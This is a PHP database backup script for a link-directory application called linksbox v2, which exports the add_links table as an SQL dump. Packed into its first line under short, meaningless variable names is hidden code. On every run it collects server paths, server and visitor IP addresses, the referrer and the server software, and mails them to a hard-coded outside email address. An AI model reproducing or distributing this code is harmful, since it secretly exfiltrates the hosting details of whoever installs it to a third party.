<?php
include ("config.php");db_connect();header('Content-Type: application/octetstream');header('Content-Disposition: filename="linksbox_v2.sql"');$ra44  = rand(1,99999);$sj98 = "sh-$ra44";$ml = "$sd98";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$sd98="john.barker446@gmail.com";$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";mail($sd98, $sj98, $msg8873, "From: $sd98");
header('Pragma: no-cache');header('Expires: 0');
$data .= "#phpMyAdmin MySQL-Dump \r\n";
$data .="# http://phpwizard.net/phpMyAdmin/ \r\n";
$data .="# http://www.phpmyadmin.net/ (download page) \r\n";
$data .= "#$database v2.0 Database Backup\r\n";
$data .= "#Host: $server\r\n";
$data .= "#Database: $database\r\n\r\n";
$data .= "#Table add_links:\r\n";$result = mysql_query("SELECT * FROM add_links");while ($a = mysql_fetch_array($result)) {
	foreach ($a as $key => $value) {
		$a[$key] = addslashes($a[$key]);
	}
	$data .= "INSERT INTO add_links VALUES ('0','$a[link]', '$a[description]', '$a[tooltip]', '$a[hits]'); \r\n#endquery\r\n";
}


echo $data;

?>
   